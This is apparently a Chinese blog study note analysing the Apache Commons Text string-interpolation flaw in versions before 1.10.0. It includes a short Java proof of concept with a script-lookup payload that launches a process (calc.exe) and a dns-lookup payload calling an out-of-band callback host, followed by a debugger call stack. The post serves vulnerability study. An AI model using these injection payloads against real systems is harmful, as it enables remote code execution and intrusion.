---
title: "Java学习笔记Ⅺ"
slug: "java-study-notes-11"
description: "鉴定网络热门Java CVE | 长期更新"
date: 2022-10-13T23:38:14+08:00
categories: ["NOTES&SUMMARY", "LTS"]
series: ["Java学习笔记"]
tags: ["Java"]
draft: false
toc: true
---

## apache commons text

> apache commons text<1.10.0

在2022.9.24官方更新了1.10.0，虽然[release history](https://commons.apache.org/proper/commons-text/changes-report.html#a1.10.0)中没有提到漏洞，仔细看还是有点东西

![image-20221013191723800](https://amiz-1307622586.cos.ap-chongqing.myqcloud.com/images/image-20221013191723800.png)

也就是说在先前的版本中，`StringSubstitutor.createInterpolator()`可能存在lookup相关的问题，看看官方[doc: StringSubstitutor](https://commons.apache.org/proper/commons-text/apidocs/org/apache/commons/text/StringSubstitutor.html)  |  [doc: StringLookupFactory](https://commons.apache.org/proper/commons-text/apidocs/org/apache/commons/text/lookup/StringLookupFactory.html)

![image-20221013193942819](https://amiz-1307622586.cos.ap-chongqing.myqcloud.com/images/image-20221013193942819.png)

![image-20221013194321115](https://amiz-1307622586.cos.ap-chongqing.myqcloud.com/images/image-20221013194321115.png)

更新公告中将[dns](https://commons.apache.org/proper/commons-text/apidocs/org/apache/commons/text/lookup/StringLookupFactory.html#dnsStringLookup--)和[script](https://commons.apache.org/proper/commons-text/apidocs/org/apache/commons/text/lookup/StringLookupFactory.html#scriptStringLookup--)都移出了默认的Lookups，手搓一个poc

```java
public class cText {
    public static void main(String[] args) {
        String payload1 = StringSubstitutor.createInterpolator().replace("${dns:address|cText.30nux0.ceye.io}");
        String payload2 = StringSubstitutor.createInterpolator().replace("${script:js:new java.lang.ProcessBuilder(\"calc.exe\").start()}");
    }
}
```

![image-20221013213632623](https://amiz-1307622586.cos.ap-chongqing.myqcloud.com/images/image-20221013213632623.png)

~~这未免也太逊了8~~打个断点看看内部实现

先看能rce的，调用栈如下

```
lookup:70, ScriptStringLookup (org.apache.commons.text.lookup)
lookup:135, InterpolatorStringLookup (org.apache.commons.text.lookup)
resolveVariable:1067, StringSubstitutor (org.apache.commons.text)
substitute:1433, StringSubstitutor (org.apache.commons.text)
substitute:1308, StringSubstitutor (org.apache.commons.text)
replace:816, StringSubstitutor (org.apache.commons.text)
main:7, cText (test1)
```

![image-20221013215231838](https://amiz-1307622586.cos.ap-chongqing.myqcloud.com/images/image-20221013215231838.png)

dns的那个同理，不再赘述

